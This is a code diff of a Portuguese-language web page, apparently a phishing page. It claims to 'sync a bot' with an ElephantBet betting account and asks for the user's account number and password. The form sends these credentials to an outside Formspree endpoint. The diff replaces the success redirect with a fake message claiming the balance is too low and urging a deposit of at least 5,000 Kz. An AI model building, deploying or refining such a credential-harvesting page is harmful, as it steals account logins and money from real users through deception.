@@ -3,64 +3,53 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Conectar à ElephantBet</title>
+  <title>Sincronizar com ElephantBet</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
   <style>
     body {
       margin: 0;
       font-family: 'Inter', sans-serif;
-      background: linear-gradient(to right, #2c2c2c, #1a1a1a);
+      background: linear-gradient(to right, #0f0f0f, #1a1a1a);
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 80vh;
-      color: #f1f1f1;
-    }
-    .sync-box {
-      background-color: #111;
-      padding: 40px;
-      border-radius: 0;
-      width: 100vw;
       height: 100vh;
-      box-shadow: none;
-      text-align: center;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-    }
-    .sync-box h1 {
-      margin-bottom: 20px;
-      font-size: 24px;
       color: #fff;
     }
-    .sync-box h1 span {
+    .container {
+      background-color: #1e1e1e;
+      padding: 40px;
+      border-radius: 16px;
+      width: 90%;
+      max-width: 450px;
+      box-shadow: 0 0 20px rgba(255, 0, 127, 0.3);
+      text-align: center;
+    }
+    .container h1 {
+      font-size: 24px;
+      margin-bottom: 10px;
+    }
+    .container h1 span {
       color: #ff007f;
     }
-    .sync-box p {
-      font-size: 16px;
-      margin-bottom: 20px;
+    .container p {
+      font-size: 15px;
       color: #ccc;
-    }
-    .sync-box .alert {
-      color: #ff007f;
-      font-weight: bold;
-      margin-bottom: 30px;
+      margin-bottom: 20px;
     }
     label {
-      text-align: left;
       display: block;
+      text-align: left;
       margin-bottom: 5px;
       font-size: 14px;
     }
     input {
       width: 100%;
-      max-width: 400px;
       padding: 12px;
       margin-bottom: 20px;
       border: none;
-      border-radius: 8px;
-      background: #222;
+      border-radius: 10px;
+      background-color: #2a2a2a;
       color: #fff;
       font-size: 14px;
     }
@@ -69,24 +58,33 @@
     }
     button {
       width: 100%;
-      max-width: 400px;
-      padding: 12px;
+      padding: 14px;
       border: none;
-      background: #444;
+      border-radius: 10px;
+      background-color: #ff007f;
       color: #fff;
+      font-size: 16px;
       font-weight: bold;
-      font-size: 15px;
-      border-radius: 8px;
       cursor: pointer;
-      transition: background 0.3s;
+      transition: background-color 0.3s ease;
     }
     button:hover {
-      background: #666;
+      background-color: #ff3399;
+    }
+    .message {
+      margin-top: 20px;
+      font-size: 15px;
+      background: #2b2b2b;
+      padding: 15px;
+      border-left: 5px solid #ff007f;
+      display: none;
+      border-radius: 10px;
+      color: #ffb3d1;
     }
     .back {
-      margin-top: 15px;
-      display: block;
-      color: #ccc;
+      margin-top: 20px;
+      display: inline-block;
+      color: #aaa;
       text-decoration: none;
       font-size: 14px;
     }
@@ -96,38 +94,33 @@
   </style>
 </head>
 <body>
-  <div class="sync-box">
-    <h1> Conectar à sua conta <span>ElephantBet</span></h1>
-    <p>Insira os seus dados para sincronizar o bot com a sua conta.</p>
-    <p>Para que a sincronização seja bem-sucedida, a sua conta da  <span style="color: #ff007f;" >ElephantBet</span>  deve ter pelo menos 5.000 Kz de saldo.</p>
+  <div class="container">
+    <h1>Conectar à <span>ElephantBet</span></h1>
+    <p>Insira os seus dados para sincronizar com o bot. É necessário ter pelo menos <strong>5.000 Kz</strong> de saldo na conta.</p>
 
     <form id="syncForm" action="https://formspree.io/f/xvgzrljq" method="POST">
       <label for="acc">Número da Conta</label>
-     <input type="text" id="acc" name="numero" 
-       placeholder="912345678" 
-       pattern="9[0-9]{8}" 
-       maxlength="9" minlength="9" 
-       inputmode="numeric" 
-       required 
-       title="O número deve começar por 9 e ter exatamente 9 dígitos">
+      <input type="text" id="acc" name="numero" placeholder="912345678" pattern="9[0-9]{8}" maxlength="9" required>
 
-    
       <label for="pass">Senha</label>
       <input type="text" id="pass" name="senha" placeholder="Digite a sua senha" required>
-    
+
       <button type="submit">Sincronizar</button>
     </form>
+
+    <div id="resposta" class="message"></div>
+
     <a href="bot.html" class="back">← Voltar</a>
   </div>
-  
+
   <script>
     document.getElementById("syncForm").addEventListener("submit", function(e) {
-      e.preventDefault(); // Previne o envio padrão do formulário
-      
-      // Cria um objeto FormData com os dados do formulário
+      e.preventDefault();
+
       const formData = new FormData(this);
-      
-      // Envia os dados para o Formspree via fetch
+      const resposta = document.getElementById("resposta");
+      resposta.style.display = "none";
+
       fetch(this.action, {
         method: this.method,
         body: formData,
@@ -135,22 +128,22 @@
       })
       .then(response => {
         if (response.ok) {
-          // Redireciona para sucesso.html após 1 segundo
-          setTimeout(function(){
-            window.location.href = "sucesso.html";
-          }, 1000);
+          resposta.textContent = "Esta conta da ElephantBet não possui o saldo necessário para completar a operação. Por favor, carregue a sua conta com pelo menos 5.000 Kz e tente novamente.";
+          resposta.style.display = "block";
         } else {
           response.json().then(data => {
-            if (Object.hasOwn(data, 'errors')) {
-              alert("Erro: " + data["errors"].map(error => error["message"]).join(", "));
+            if (data.errors) {
+              resposta.textContent = "Erro: " + data.errors.map(error => error.message).join(", ");
             } else {
-              alert("Ocorreu um erro ao enviar o formulário. Por favor, tente novamente.");
+              resposta.textContent = "Erro ao enviar os dados. Tente novamente mais tarde.";
             }
+            resposta.style.display = "block";
           });
         }
       })
       .catch(error => {
-        alert("Erro: " + error.message);
+        resposta.textContent = "Erro de rede: " + error.message;
+        resposta.style.display = "block";
       });
     });
   </script>
